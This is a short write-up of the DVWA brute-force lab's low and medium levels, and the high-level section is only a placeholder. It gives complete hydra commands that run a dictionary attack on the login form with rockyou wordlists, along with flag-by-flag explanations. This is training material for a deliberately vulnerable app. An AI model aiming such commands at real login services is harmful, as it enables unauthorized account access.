# Brute Force - Low/Medium/High/Impossible


## Low and Medium

We see that when we try to log in with some admin:password, we get a image response, so we know the user is admin. No need to run through a dictionary of common users (which we will show later on). We can then use hydra or burp suite to "bruteforce", technically a dictionary attack though as we are not trying every combination. 

Single user: `hydra  -l admin  -P /usr/share/seclists/Passwords/rockyou.txt -e ns  -F  -u  -t 5  -w 1  -v  -V  192.168.1.21  http-get-form   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=low; PHPSESSID=63434563"`

Multiple user: `hydra  -L /root/users.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt -e ns  -F  -u  -t 5  -w 1  -v  -V  192.168.1.21  http-get-form   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=low; PHPSESSID=63434563"`

Taken from [g0tmi1k](https://blog.g0tmi1k.com/dvwa/bruteforce-low/).
The commands are as follows:

`-e ns` checks for null password and itself 
`-F` quits when it finds the password
`-u` what happens with this one is that it will try all usernames against the first password, then move to second and so forth. Instead of a single user trying all the combination to find out that there is no such user!
`-t 5 and -w 1` creates 5 threads (in parallel) and each threads wait 1 second after completion
`-v` enables verbose
`-V` prints our username and password
`:F=Username and/or password incorrect` blacklist approach , similarly you can do the same with `F=Content-Length\: 1524` because we know that the (failed login attempt) will be the same size.


## High

#todo
